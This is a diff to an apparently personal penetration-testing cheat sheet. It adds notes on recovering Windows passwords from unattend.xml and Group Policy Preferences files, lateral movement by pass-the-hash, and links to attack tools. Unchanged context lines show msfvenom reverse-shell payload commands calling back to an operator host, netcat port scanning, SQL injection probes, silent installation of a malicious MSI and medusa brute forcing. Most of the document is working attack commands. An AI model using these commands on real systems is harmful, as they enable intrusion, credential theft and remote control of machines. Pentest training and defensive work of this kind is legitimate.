@@ -72,6 +72,9 @@ tr "\n" ","
  7. Vulnerabilities
  8. Default Creds for all the things
  In short look for the way in....
+
+ An enormous guide.... http://www.0daysecurity.com/penetration-testing/enumeration.html
+
 ============================================================================================
 PORT SCANNING (All ports for both TCP/UDP)
 ********************************************************
@@ -204,7 +207,7 @@ openssl s_client -connect $tgt:443
 Scanning Misc.
 ********************************************************
 # netcat cycle through ports.... poorman's scanner. It outputs in stderr so
-# redirect stderr to std out (2>&1)
+# redirect stderr to std out (2>&1)=
 nc -nvv -w 1 -z $tgt 1-65535 2>&1 | tee nc_scan.txt
 
 #snmp-check- mad loot if the target offers snmp with a public string
@@ -416,6 +419,8 @@ msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
 
 # ? what else?
 
+# MSF5 Evasion Payloads
+
 ----------------------------------- More Advanced Venom Examples --------------------------------------------
 #  Exit THREAD instead of a Process to leave a door open (example bind shell)
 
@@ -443,6 +448,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$me LPORT=53 -f exe -e x86/shi
 ============================================================================================
 					WINDOWS COMMAND LINE STUFF
 ============================================================================================
+# GREAT Source for WMIC Commands!
+https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
+
 #Show networked drives
 net share
 
@@ -563,7 +571,7 @@ IOW see if it breaks- if it does it is passing stuff directly to the back-end :-
 #Does it break? Add a ' to the end of the line
 http://$tgt/comment.php?id=738'
 
-********************************MAPPING IT**************************************
+******************************* MAPPING IT *************************************
 Goals:
 1. How many columns?
 2. Find the 'viewport'... where can we make data appear?
@@ -904,7 +912,33 @@ msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
 # behavior of /quiet in the MISEXEC command
 
 ---------- Option 4: Unattended Installs -----------------------
+# Locations to search for unattended.xml
+# C:\Windows\Panther\
+# C:\Windows\Panther\Unattend\
+# C:\Windows\System32\
+# C:\Windows\System32\sysprep\
+# Also look for: sysprep.xml and sysprep.inf
+# What to look for in an unattended.xml: <UserAccounts> or <AdministratorPassword>
+# Passwords are merely obfuscated in Base64
 
+echo "UEBzc3dvcmQxMjMhUGFzc3dvcmQ=" | base64 -d
+
+# Microsoft appends "Password" to the end of the obfuscated password
+# So Pa$$w0rd!Password is really: Pa$$w0rd!
+
+# MSF: post/windows/gather/enum_unattend
+
+---------- Option 5: GPP Abuse (Getting ancient...)----------
+# Looking for groups.xml which is...
+# Located in the DC:  \DC Server1\Sysvol\
+# Inside the file we are looking for the field for cpassword... "cpassword="
+# The password is encrypted with AES-32 bit... but key is publicly known now...
+# KEY:  ANY DOMAIN USER HAS ACCESS TO THIS FILE!
+# MSF: post/windows/gather/credentials/gpp
+# POSH Script to do the same: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+# Now you can move laterally very quickly with PTH or the MSF Psexec
+# This should be heavily restricted by:
+# MITIGATION: MS14-025
 
 
 ------------------------------------------------------------------
@@ -1283,6 +1317,11 @@ john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
 
 #Caracking HTTP
 medusa -h $tgt -n 9505 -u bethany -P mutated.txt -M http -m DIR:/~Public -T 10
+
+==========================================================================================
+                LATERAL MOVEMENT
+==========================================================================================
+# 
 
 
 ==========================================================================================
